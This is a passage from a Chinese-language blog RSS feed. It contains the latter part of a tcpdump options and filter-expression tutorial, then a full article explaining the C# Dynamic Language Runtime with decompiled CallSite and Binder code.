&lt;span&gt; 83&lt;/span&gt; -S  打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距,比如, 接受方收到第一个数据包的绝对顺序号为232323, 对于后来接收到的第2个,第3个数据包, tcpdump会打印其序列号为1, 2分别表示与第一个数据包的差距为1 和 &lt;span&gt;2&lt;/span&gt;. 而如果此时-S 选项被设置, 对于后来接收到的第2个, 第3个数据包会打印出其绝对顺序号:&lt;span&gt;232324&lt;/span&gt;, &lt;span&gt;232325&lt;/span&gt;&lt;span&gt;).
&lt;/span&gt;&lt;span&gt; 84&lt;/span&gt; 
&lt;span&gt; 85&lt;/span&gt; -&lt;span&gt;s  snaplen
&lt;/span&gt;&lt;span&gt; 86&lt;/span&gt;     ★★★★★设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是262144字节【&lt;span&gt;256&lt;/span&gt;&lt;span&gt; Kb】。需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少tcpdump 可缓存的数据包的数量，从而会导致数据包的丢失。所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好。将snaplen设置为0将其设置为262144的默认值，以便向后兼容最新版本的tcpdump。
&lt;/span&gt;&lt;span&gt; 87&lt;/span&gt; 
&lt;span&gt; 88&lt;/span&gt; -&lt;span&gt;T  type
&lt;/span&gt;&lt;span&gt; 89&lt;/span&gt; &lt;span&gt;    强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:
&lt;/span&gt;&lt;span&gt; 90&lt;/span&gt;     aodv (Ad-hoc On-&lt;span&gt;demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),
&lt;/span&gt;&lt;span&gt; 91&lt;/span&gt;     cnfp (Cisco  NetFlow  protocol),  rpc(Remote Procedure Call), rtp (Real-&lt;span&gt;Time Applications protocol),
&lt;/span&gt;&lt;span&gt; 92&lt;/span&gt;     rtcp (Real-Time Applications con-&lt;span&gt;trol protocol), snmp (Simple Network Management Protocol),
&lt;/span&gt;&lt;span&gt; 93&lt;/span&gt; &lt;span&gt;    tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电
&lt;/span&gt;&lt;span&gt; 94&lt;/span&gt; &lt;span&gt;    视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).
&lt;/span&gt;&lt;span&gt; 95&lt;/span&gt; 
&lt;span&gt; 96&lt;/span&gt; -&lt;span&gt;t     在每行输出中不打印时间戳
&lt;/span&gt;&lt;span&gt; 97&lt;/span&gt; 
&lt;span&gt; 98&lt;/span&gt; -&lt;span&gt;tt    不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成1261798315)
&lt;/span&gt;&lt;span&gt; 99&lt;/span&gt; 
&lt;span&gt;100&lt;/span&gt; -&lt;span&gt;ttt   tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)
&lt;/span&gt;&lt;span&gt;101&lt;/span&gt; 
&lt;span&gt;102&lt;/span&gt; -&lt;span&gt;tttt  在每行打印的时间戳之前添加日期的打印
&lt;/span&gt;&lt;span&gt;103&lt;/span&gt; 
&lt;span&gt;104&lt;/span&gt; -&lt;span&gt;u     打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)
&lt;/span&gt;&lt;span&gt;105&lt;/span&gt; 
&lt;span&gt;106&lt;/span&gt; -U    使得当tcpdump在使用-&lt;span&gt;w&lt;/span&gt;&lt;span&gt; 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中,而不是等文件的输出缓冲已满时才真正写入此文件)
&lt;/span&gt;&lt;span&gt;107&lt;/span&gt;       -&lt;span&gt;U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.
&lt;/span&gt;&lt;span&gt;108&lt;/span&gt; 
&lt;span&gt;109&lt;/span&gt; -&lt;span&gt;v    当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性检测, 比如对IP或ICMP包头部的校验和.
&lt;/span&gt;&lt;span&gt;110&lt;/span&gt; 
&lt;span&gt;111&lt;/span&gt; -vv   产生比-&lt;span&gt;v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.
&lt;/span&gt;&lt;span&gt;112&lt;/span&gt; 
&lt;span&gt;113&lt;/span&gt; -vvv  产生比-&lt;span&gt;vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面,
&lt;/span&gt;&lt;span&gt;114&lt;/span&gt; &lt;span&gt;      其相应的图形选项将会以16进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).
&lt;/span&gt;&lt;span&gt;115&lt;/span&gt; 
&lt;span&gt;116&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt; &lt;span&gt;file&lt;/span&gt;   ★★★★★把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-&lt;span&gt;r 选项来重新读入并进行分析和打印。
&lt;/span&gt;&lt;span&gt;117&lt;/span&gt;       &lt;span&gt;file&lt;/span&gt; 为 -&lt;span&gt; 时，表示标准输出 也就是输出到标准输出中
&lt;/span&gt;&lt;span&gt;118&lt;/span&gt; # tcpdump -&lt;span&gt;w&lt;/span&gt; - |&lt;span&gt;strings 这是一个超级有用的命令,把包的数据，用字符展示出来
&lt;/span&gt;&lt;span&gt;119&lt;/span&gt; 
&lt;span&gt;120&lt;/span&gt; -&lt;span&gt;W
&lt;/span&gt;&lt;span&gt;121&lt;/span&gt;       此选项与-&lt;span&gt;C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的0, 这可以方便这些文件被正确的排序.
&lt;/span&gt;&lt;span&gt;122&lt;/span&gt; 
&lt;span&gt;123&lt;/span&gt; -x    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据(但不包括连接层的头部).总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长,并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so &lt;span&gt;for&lt;/span&gt;&lt;span&gt; link  layers  that pad, 未能衔接理解和翻译, 需补充 )
&lt;/span&gt;&lt;span&gt;124&lt;/span&gt; 
&lt;span&gt;125&lt;/span&gt; -&lt;span&gt;xx   tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据, 其中包括数据链路层的头部.
&lt;/span&gt;&lt;span&gt;126&lt;/span&gt; 
&lt;span&gt;127&lt;/span&gt; -&lt;span&gt;X    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部).这对于分析一些新协议的数据包很方便.
&lt;/span&gt;&lt;span&gt;128&lt;/span&gt; 
&lt;span&gt;129&lt;/span&gt; -&lt;span&gt;XX   当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部.这对于分析一些新协议的数据包很方便.
&lt;/span&gt;&lt;span&gt;130&lt;/span&gt; 
&lt;span&gt;131&lt;/span&gt; -&lt;span&gt;y    datalinktype
&lt;/span&gt;&lt;span&gt;132&lt;/span&gt; &lt;span&gt;      设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包
&lt;/span&gt;&lt;span&gt;133&lt;/span&gt; 
&lt;span&gt;134&lt;/span&gt; -&lt;span&gt;Z    user
&lt;/span&gt;&lt;span&gt;135&lt;/span&gt; &lt;span&gt;      使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程)
&lt;/span&gt;&lt;span&gt;136&lt;/span&gt; 
&lt;span&gt;137&lt;/span&gt;       此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;该表达式用于决定哪些数据包将被打印。如果不给定条件表达式，网络上所有被捕获的包都会被打印。否则，只有满足条件表达式的数据包被打印.(nt: all packets, 可理解为，所有被指定接口捕获的数据包)。&lt;/p&gt;
&lt;p&gt;表达式由一个或多个&lt;span&gt;表达元&lt;/span&gt;组成(nt：primitive，表达元，可理解为组成表达式的基本元素)。一个表达元通常由一个或多个修饰符(qualifiers)后跟一个名字或数字表示的id组成(nt：即 qualifiers id )。有三种不同类型的修饰符：type、dir以及 proto。&lt;/p&gt;
&lt;p&gt;参见：&lt;span&gt;&lt;strong&gt;man pcap-filter&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;type   修饰符指定id 所代表的对象类型, id可以是名字也可以是数字. 
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;    可选的对象类型有: host, net, port 以及portrange(nt: host 表明id是主机, net 表明id是网络, port 表明id是端口，而portrange 表明id 是一个端口范围).  
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     如, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;host foo&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;net 128.3&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;port 20&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;portrange 6000-6008&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;(nt: 分别表示主机 foo,网络 &lt;span&gt;128.3&lt;/span&gt;, 端口 &lt;span&gt;20&lt;/span&gt;, 端口范围 &lt;span&gt;6000&lt;/span&gt;-&lt;span&gt;6008&lt;/span&gt;&lt;span&gt;). 
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;     如果不指定type 修饰符, id默认的修饰符为host. ★★
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;dir&lt;/span&gt;&lt;span&gt;   修饰符描述id 所对应的传输方向, 即发往id 还是从id 接收（nt: 而id 到底指什么需要看其前面的type 修饰符）。
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;    可取的方向为: src, dst, src or dst, src and dst.(nt:分别表示, id是传输源, id是传输目的, id是传输源或者传输目的, id是传输源并且是传输目的). 
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     例如, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;src foo&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;dst net 128.3&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;src or dst port ftp-data&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.(nt: 分别表示符合条件的数据包中, 源主机是foo, 目的网络是128.&lt;span&gt;3&lt;/span&gt;, 源或目的端口为 &lt;span&gt;ftp&lt;/span&gt;-&lt;span&gt;data).
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;     如果不指定dir修饰符, &lt;span&gt;id&lt;/span&gt; 默认的修饰符为src or dst。★★
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;57&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; proto   修饰符描述id 所属的协议. 可选的协议有: ether, fddi, &lt;span&gt;tr&lt;/span&gt;&lt;span&gt;, wlan, ip, ip6, arp, rarp, decnet, tcp以及 upd.
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     (nt | rt: ether, fddi, &lt;span&gt;tr&lt;/span&gt;&lt;span&gt;, 具体含义未知, 需补充. 可理解为物理以太网传输协议, 光纤分布数据网传输协议,以及用于路由跟踪的协议.  
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     wlan, 无线局域网协议; ip,ip6 即通常的TCP/&lt;span&gt;IP协议栈中所使用的ipv4以及ipv6网络层协议;
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;    arp, rarp 即地址解析协议,反向地址解析协议; 
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;     decnet, Digital Equipment Corporation开发的, 最早用于PDP-&lt;span&gt;11&lt;/span&gt;&lt;span&gt; 机器互联的网络协议; 
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     tcp and udp, 即通常TCP/IP协议栈中的两个传输层协议).
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;表达式顺序：&lt;span&gt;&lt;strong&gt;proto dir type&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对于修饰符后跟id 的格式，可理解为 type id 是对包最基本的过滤条件：即对包相关的主机，网络，端口的限制；dir 表示对包的传送方向的限制；proto表示对包相关的协议限制&lt;/p&gt;
&lt;p&gt;表达元之间还可以通过关键字and，or 以及 not 进行连接，从而可组成比较复杂的条件表达式。比如，host foo and not port ftp and not port ftp-data (nt：其过滤条件可理解为，数据包的主机为foo，并且端口不是ftp(端口21) 和ftp-data(端口20，常用端口和名字的对应可在linux 系统中的/etc/service 文件中找到))。&lt;/p&gt;
&lt;p&gt;为了表示方便，同样的修饰符可以被省略，如 tcp dst port ftp or ftp-data or domain 与以下的表达式含义相同 tcp dst port ftp or tcp dst port ftp-data or tcp dst port domain。(nt：其过滤条件可理解为：包的协议为tcp，目的端口为ftp 或 ftp-data 或 domain(端口53) )。&lt;/p&gt;

&lt;hr/&gt;
&lt;p&gt;———END———&lt;/p&gt;
&lt;p&gt;如果觉得不错就关注下呗 (-^O^-) ！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/common/1395193/202002/1395193-20200220232237733-365559387.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 20 Feb 2020 15:24:00 +0000</pubDate>
<dc:creator>踏歌行666</dc:creator>
<og:description>Linux tcpdump 命令详解，常用命令选项与常见示例</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zhanglianghhh/p/12339731.html</dc:identifier>
</item>
<item>
<title>一文带你了解 C# DLR 的世界 - 沉睡的木木夕</title>
<link>http://www.cnblogs.com/ms27946/p/DLR-In-CSharp.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ms27946/p/DLR-In-CSharp.html</guid>
<description>&lt;p&gt;在很久之前，我写了一片文章&lt;a href=&quot;https://www.cnblogs.com/ms27946/p/4976330.html&quot;&gt;dynamic结合匿名类型 匿名对象传参&lt;/a&gt;，里面我以为DLR内部是用反射实现的。因为那时候是心中想当然的认为只有反射能够在运行时解析对象的成员信息并调用成员方法。后来也是因为其他的事一直都没有回过头来把这一节知识给补上，正所谓亡羊补牢，让我们现在来大致了解一下DLR吧。&lt;/p&gt;
&lt;p&gt;DLR 全称是 Dynamic Language Runtime（动态语言运行时）。这很容易让我们想到同在C#中还有一个叫 CLR 的东西，它叫 Common Language Runtime。那这两者有什么关系呢？这个后续再说&lt;/p&gt;
&lt;p&gt;DLR 是 C#4.0 新引进来的概念，其主要目的就是为了&lt;strong&gt;动态绑定与交互&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;DLR 首先定义了一个核心类型概念，即动态类型。即在运行时确定的类型，动态类型的成员信息、方法等都只在运行时进行绑定。与CLR的静态类型相反，静态类型都是在C#编译期间通过一系列的规则匹配到最后的绑定。&lt;/p&gt;
&lt;p&gt;将这种动态进行绑定的过程它有点类似反射，但其内部却和反射有很大的不同。这个稍微会谈到。&lt;/p&gt;
&lt;p&gt;由动态类型构成的对象叫动态对象。&lt;/p&gt;
&lt;p&gt;DLR一般有下列特点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;把CLR的所有类型全部隐式转成&lt;code&gt;dynamic&lt;/code&gt;。如&lt;code&gt;dynamic x = GetReturnAnyCLRType()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;同样，dynamic几乎也可以转换成CLR类型。&lt;/li&gt;
&lt;li&gt;所有含有动态类型的表达式都是在运行期进行动态计算的。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;DLR发展到现在，我们几乎都使用了动态类型关键字 &lt;code&gt;dynamic&lt;/code&gt;以及还有引用DLR的类库 Dapper等。&lt;/p&gt;
&lt;p&gt;在我们不想创建新的静态类做DTO映射时，我们第一时间会想到动态类型。也经常性的将dynamic作为参数使用。&lt;/p&gt;
&lt;p&gt;这时候我们就要注意一些 dynamic 不为大多人知的一些细节了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不是只要含有 dynamic 的表达式都是动态的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;什么意思呢，且看这段代码&lt;code&gt;dynamic x = &quot;marson shine&quot;;&lt;/code&gt;。这句代码很简单，就是将字符串赋值给动态类型 x。&lt;/p&gt;
&lt;p&gt;大家不要以为这就是动态类型了哦，其实不是，如果单单只是这一句的话，C#编译器在编译期间是会把变量 x 转变成静态类型 object 的，等价于&lt;code&gt;object x = &quot;marson shine&quot;;&lt;/code&gt;。可能有些人会惊讶，为什么C#编译器最后会生成object类型的代码。这就是接下来我们要注意的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;dynamic 于 object 的不可告人的关系&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其实如果你是以 dynamic 类型为参数，那么实际上它就是等于 object 类型的。换句话说，dynamic在CLR级别就是object。其实这点不用记，我们从编译器生成的C#代码就知道了。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;这里我用的是dotpeek查看编译器生成的c#代码。&lt;/p&gt;
&lt;p&gt;这里顺便想问下各位，有没有mac下c#反编译的工具。求推荐&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以我们在写重载方法时，是不能以 object 和 dynamic 来区分的。&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;void DynamicMethod(object o);
void DynamicMethod(dynamic d);  // error 编译器无法通过编译:已经存在同名同形参的方法&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果说 dynamic 与 object 一样，那么它与 DLR 又有什么关系呢？&lt;/p&gt;
&lt;p&gt;其实微软提供这么一个关键字，我认为是方便提供创建动态类型的快捷方式。而真正于动态类型密切相关的是命名空间&lt;code&gt;System.Dynamic&lt;/code&gt;下的类型。主要核心类&lt;code&gt;DynamicObject,ExpandoObject,IDynamicMetaObjectProvider&lt;/code&gt; ，关于这三个类我们这节先不谈。&lt;/p&gt;

&lt;p&gt;首先我们来大致了解C#4.0加入的重要功能 DLR，在编译器中处于什么层次结构。&lt;/p&gt;
&lt;p&gt;在这里我引用 &lt;a href=&quot;https://www.codeproject.com/Articles/42997/NET-4-0-FAQ-Part-1-The-DLR&quot; class=&quot;uri&quot;&gt;https://www.codeproject.com/Articles/42997/NET-4-0-FAQ-Part-1-The-DLR&lt;/a&gt; 这片文章的一副结构图的意思&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/777295/202002/777295-20200220231640009-1251091403.jpg&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;动态编程 = CLR + DLR&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这足以说明 DLR 在C#中的位置，虽然名字与CLR只有一个字母之差，但是它所处的层次其实是在CLR之上的。我们知道编译器将我们写的代码转换成IL，然后经由CLR转换成本地代码交由CPU执行可执行程序。那么实际上，&lt;strong&gt;DLR 是在编译期间和运行期做了大量工作。最后还是会将C#代码转换成CLR静态语言，然后再经由 CLR 将代码转换成本地代码执行&lt;/strong&gt;（如调用函数等）。&lt;/p&gt;
&lt;p&gt;现在我们来简要介绍一下DLR在编译期间做了什么。&lt;/p&gt;
&lt;p&gt;到这里就不得不以例子来做说明了，我们就上面的例子稍加改造一下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;// program.cs
dynamic x = &quot;marson shine&quot;;
string v = x.Substring(6);
Console.WriteLine(v);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;为了节省篇幅，我简化并改写了难看的变量命名以及不必要的注释。生成的代码如下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;            object obj1 = (object) &quot;marson shine&quot;;
      staticCallSite1 = staticCallSite1 ?? CallSite&amp;lt;Func&amp;lt;CallSite, object, int, object&amp;gt;&amp;gt;.Create(Binder.InvokeMember(CSharpBinderFlags.None, &quot;Substring&quot;, (IEnumerable&amp;lt;Type&amp;gt;) null, typeof (Example), (IEnumerable&amp;lt;CSharpArgumentInfo&amp;gt;) new CSharpArgumentInfo[2]
      {
        CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
        CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
      }));

      object obj2 = ((Func&amp;lt;CallSite, object, int, object&amp;gt;) staticCallSite1.Target)((CallSite) staticCallSite1, obj1, 6);
        staticCallSite2 = staticCallSite2 ?? CallSite&amp;lt;Action&amp;lt;CallSite, Type, object&amp;gt;&amp;gt;.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, &quot;WriteLine&quot;, (IEnumerable&amp;lt;Type&amp;gt;) null, typeof (Example), (IEnumerable&amp;lt;CSharpArgumentInfo&amp;gt;) new CSharpArgumentInfo[2]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
        }));

      ((Action&amp;lt;CallSite, Type, object&amp;gt;) staticCallSite2.Target)((CallSite) staticCallSite2, typeof (Console), obj2);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上问的两个变量&lt;code&gt;staticCallSite1,staticCallSite2&lt;/code&gt; 是静态变量，起到缓存的作用。&lt;/p&gt;
&lt;p&gt;这里涉及到了DLR核心三个概念&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;ExpressTree（表达式树）：通过CLR运行时用抽象语法树（AST）生成代码并执行。并且它也是用来与动态语言交互的主要工具（如Python，JavaScript 等）&lt;/li&gt;
&lt;li&gt;CallSite（调用点）：当我们写的调用动态类型的方法，这就是一个调用点。这些调用都是静态函数，是能够缓存下来的，所以在后续的调用，如果发现是相同类型的调用，就会更快的运行。&lt;/li&gt;
&lt;li&gt;Binder（绑定器）：除了调用点之外，系统还需要知道这些方法如何调用，就比如例子中的通过调用&lt;code&gt;Binder.InvokeMember&lt;/code&gt;方法，以及是那些对象类型调用的方法等信息。绑定器也是可以缓存的&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;DLR运行过程我们总结起来就是，在运行时DLR利用编译运行期间生成的&lt;strong&gt;表达式树&lt;/strong&gt;、&lt;strong&gt;调用点&lt;/strong&gt;、&lt;strong&gt;绑定器&lt;/strong&gt;代码，以及缓存机制，我们就可以做到计算的重用来达到高性能。在很早前从老赵的&lt;a href=&quot;http://blog.zhaojie.me/2009/05/expression-cache-7-optimization.html&quot;&gt;表达式树缓存系列&lt;/a&gt;文章也指出了，利用表达式树缓存性能最接近直接调用（当然不包括IL编程）。&lt;/p&gt;
&lt;p&gt;现在我们就知道了为什么DLR能干出与反射相同的效果，但是性能要远比反射要高的原因了。&lt;/p&gt;
&lt;p&gt;参数资料：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://www.codeproject.com/Articles/42997/NET-4-0-FAQ-Part-1-The-DLR&quot; class=&quot;uri&quot;&gt;https://www.codeproject.com/Articles/42997/NET-4-0-FAQ-Part-1-The-DLR&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;《深入理解C#》&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Thu, 20 Feb 2020 15:17:00 +0000</pubDate>
<dc:creator>沉睡的木木夕</dc:creator>
<og:description>一文带你了解 C DLR 的世界 在很久之前，我写了一片文章 &amp;quot;dynamic结合匿名类型 匿名对象传参&amp;quot; ，里面我以为DLR内部是用反射实现的。因为那时候是心中想当然的认为只有反</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/ms27946/p/DLR-In-CSharp.html</dc:identifier>
</item>
</channel>
</rss>